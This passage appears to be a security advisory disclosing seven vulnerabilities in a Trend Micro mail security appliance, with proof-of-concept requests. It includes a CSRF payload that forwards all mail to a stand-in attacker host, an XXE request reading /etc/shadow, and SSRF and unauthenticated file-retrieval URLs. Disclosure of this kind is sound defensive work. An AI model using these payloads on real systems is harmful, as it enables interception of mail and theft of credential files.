Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of this
and similar Trend Micro products conducted by security professionals to
identify and resolve potential further security issues.


Vulnerability overview/description:
-----------------------------------
1) Cross-Site Request Forgery (CSRF
CVE-2020-27016 (7.5 CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H)

A web service accessible to authenticated administrators allows modifying the
appliance's policy configuration. This web service can also be accessed by
leveraging a CSRF scenario. An attacker could therefore modify policy rules
(e.g. bypass malware checks or forward all mails to another host) by tricking
an authenticated administrator into accessing an attacker-controlled web page.


2) XML External Entity Processing (XXE)
CVE-2020-27017 (7.6 CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)

The web service from vulnerability #1 accepts requests in the form of XML documents.
The XML parser used is not configured correctly, thus allowing an authenticated
administrator to read arbitrary local files through XXE.

Through an OOB XXE attack an attacker can exfiltrate local files through CSRF
(see #1).


3) Over-privileged Users/Services
Sudo is configured to allow several system users access to the root account.
An attacker gaining control over one of these accounts can access the system as
root. Moreover, several services are executed with the privileges of the user
root. Therefore, finding #2 allows an attacker to read files only accessible to
root (e.g. /etc/shadow).


4) Server Side Request Forgery (SSRF) & Local File Disclosure
CVE-2020-27018 (2.8 CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N/E:U/RL:X/RC:X)

A script accessible through the appliance's web server can be abused to request
any URL (e.g. http(s), file). An authenticated attacker can e.g. access any
http(s) resources or parts of some local files.


5) Information Disclosure
CVE-2020-27019 (4.8 CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L/E:U/RL:X/RC:X)

An SQLite database as well as a cryptographic key located in the webroot can be
accessed without authentication.

Note: It is unclear what the key is used for and whether the SQLite database
could contain sensitive information in specific configurations.


6) Insufficient Password Storage
CVE-2020-27693 (3.1 CVSS:3.0/AV:L/AC:L/PR:H/UI:R/S:U/C:L/I:N/A:L/E:U/RL:X/RC:X)

The appliance stores passwords of administrative users as unsalted MD5 hashes
which can be cracked easily.


7) Outdated Software
CVE-2020-27694 (4.6 CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:L/E:U/RL:X/RC:X)

Several software components installed on the appliance are outdated. Moreover,
the software updates provided by Trend Micro do not update the packages of the
CentOS base system.

SEC Consult did not verify whether the vulnerabilities identified through the
version information are present or whether the vulnerabilities have an impact
on the security of the system.


Proof of concept:
-----------------
1) Cross-Site Request Forgery (CSRF) (CVE-2020-27016)
The following request will create a rule that forwards all mails to an attacker:

--- snip ---
POST /ws_policies.imss HTTP/1.1
Host: [...]
Cookie: JSESSIONID=[...];
Content-Length: 374

<policies>
 <policy
     name="forward all traffic to attacker"
     note="forward all traffic to attacker"
     enable="yes"
     version="1"
     order="1"
     type="other">
  <route direction="incoming">
   <from anyone="yes"></from>
   <to anyone="yes"></to>
  </route>
  <actions>
   <hand_off>attacker:25</hand_off>
  </actions>
 </policy>
</policies>
--- snip ---

The following HTML fragment shows how this request can be sent in a CSRF
scenario:

--- snip ---
<form action="https://[...]:8445/ws_policies.imss" method="POST"
      enctype="text/plain">
  <input type="hidden" name='<policies><policy name'
      value='"forward all traffic to attacker"
      note="forward all traffic to attacker"
      enable="yes" version="1" order="1"  type="other">
      <route direction="incoming"><from anyone="yes"></from>
      <to anyone="yes"></to></route>
      <actions><hand_off>attacker:25</hand_off></actions>
      </policy></policies>' />
  <input type="submit" value="Submit request" />
</form>
--- snip ---


2) XML External Entity Processing (XXE) (CVE-2020-27017)
The following request demonstrates the retrieval of /etc/shadow

--- snip ---
POST /ws_policies.imss HTTP/1.1
Host: [...]:8445
Cookie: JSESSIONID=[...];
Content-Length: 290

<!DOCTYPE foo [<!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM  "file:///etc/shadow" >]>
<policies>
 <policy name="test" note="test" enable="yes" version="1" order="2" type="virus">
  <route direction="incoming">
  <from anyone="no">
   <group>&xxe;</group>
  </from>
  </route>
 </policy>
</policies>
--- snip ---


3) Over-privileged Users/Services
The local users "admin", "enable" and all users in the group "cliusers" can execute
commands as root (no password entry required). Note that at least for the users
"admin" and "enable" a restricted shell is configured, thus shell access is not
easily possible.

Several network services (e.g. Tomcat, OpenLDAP, imssmgr) are executed as root.

Trend Micro supplied the following additional information:
(a) If an IMSVA user created clish users, they can only run limited commands
    (IMSVA pre-defined commands) and all of these are one time commands
    (not a running service in the backend)
(b) Most of these clish commands only read logs, and does not accept any arguments,
    so it cannot terminate or inject commands.
(c) Few commands (such as ping) only accept few arguments (such as IP), but these
    are well-checked. Users cannot input any arguments with other meaning, so it
    cannot terminate or inject commands.

Trend Micro decided not to include vulnerability #3 in the hardening/patch of the
product as admin and enabled accounts are as important as root and changing the
architecture would cause some functions not to work as expected.


4) Server Side Request Forgery (SSRF) & Local File Disclosure (CVE-2020-27018)
The URL demonstrates the retrieval of an HTTP URL through the appliance:

https://<host>:8445/widget/proxy_controller.php?module=modSimple&userGenerated=1&serverid=1&url=http://test

When accessing file:// URLs, the application sends only the content that follows
a sequence \r\n\r\n. Therefore only parts of certain files can be retrieved.


5) Information Disclosure (CVE-2020-27019)
The following URL demonstrates the unauthenticated retrieval of a cryptographic
key:

https://<host>:8445/widget/repository/inc/class/common/crypt/crypt.key

Moreover, an SQLite database can be retrieved.
https://<host>:8445/widget/repository/db/sqlite/tmwf.db

The contents of these files have not been further investigated.


6) Insufficient Password Storage (CVE-2020-27693)
The passwords for local administrators are stored in a Postgres database
(table tb_administrator, column md5_digest). The hashes are stored as unsalted
MD5 digests which can be cracked easily.


7) Outdated Software (CVE-2020-27694)
The following software versions are present in an appliance with patch level
1993:
* PHP 5.6.38 (PHP 5.6 is EOL)
* Apache HTTPD 2.4.37 (see http://httpd.apache.org/security/vulnerabilities_24.html)
* Apache Tomcat 9.0.13 (see http://tomcat.apache.org/security-9.html)

The appliance is built on top of a CentOS base system. The CentOS packages
appear not to be updated with appliance updates. In a test system, the command
"yum check-update" yielded 203 updates to installed packages.


Vulnerable / tested versions:
-----------------------------
Version 9.1.0.1960 Critical Patch 1993 has been tested and was found to be
vulnerable. Previous versions are affected as well.
